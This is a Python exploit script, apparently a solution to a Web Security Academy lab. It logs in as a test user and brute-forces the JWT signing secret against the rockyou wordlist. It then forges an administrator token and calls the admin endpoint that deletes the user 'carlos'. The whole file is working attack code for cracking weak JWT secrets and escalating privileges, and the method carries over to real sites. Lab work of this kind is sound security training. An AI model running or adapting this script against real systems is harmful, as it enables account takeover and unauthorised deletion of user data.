import requests as rq
import subprocess
from bs4 import BeautifulSoup
import jwt
import base64


def delete_carlos(modified_token):
    cookies = {"session": modified_token}
    delete_url = f"{BASE}/admin/delete?username=carlos"

    r = rq.get(delete_url, cookies=cookies)

    if r.status_code == 200:
        print("[+] Done!")
    else:
        print(f"[-] Failed: {r.status_code}")

BASE = "https://0a7b0086044891128035cb8b007d00d6.web-security-academy.net/"
LOGIN = f"{BASE}/login"
WORDLIST = 'rockyou.txt'

s = rq.Session()

r = s.get(LOGIN)
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

resp = s.post(LOGIN, data={
    "csrf": csrf,
    "username": "wiener",
    "password": "peter"
})

print("[+] Status:", resp.status_code)

jwt_token = s.cookies.get("session")

decode_token = jwt.decode(jwt_token, options={"verify_signature": False})
print(f"[+] Decode token: {decode_token}\n")


def fuzzing_check(secret_key, algorithm):
    try:
        decode = jwt.decode(jwt_token, secret_key, algorithms=[algorithm])
        print(f"[+] Valid key found: {secret_key}")
        print(f"[+] Decode payload: {decode}")
        return True
    except jwt.InvalidSignatureError:
        return False
    except jwt.DecodeError:
        return False


def fuzzing(wordlist):
    header = jwt.get_unverified_header(jwt_token)
    algorithm = header.get("alg")
    if not algorithm:
        print("[+] Algorithm not found")
        return None
    else:
        print(f"[+] Algorithm: {algorithm}")
    
    with open(wordlist, 'r') as file:
        for line in file:
            secret_key = line.strip()
            if fuzzing_check(secret_key, algorithm):
                return secret_key, algorithm
        return None


found_key, algorithm = fuzzing(WORDLIST)

if found_key:
    print(f"[+] Secret key found: {found_key}")
    payload = decode_token.copy() 
    payload["sub"] = "administrator"
    modified_token = jwt.encode(payload, found_key, algorithm=algorithm)

    print("[+] Forged token:", modified_token)

    delete_carlos(modified_token)
else:
    print("[+] No key found")
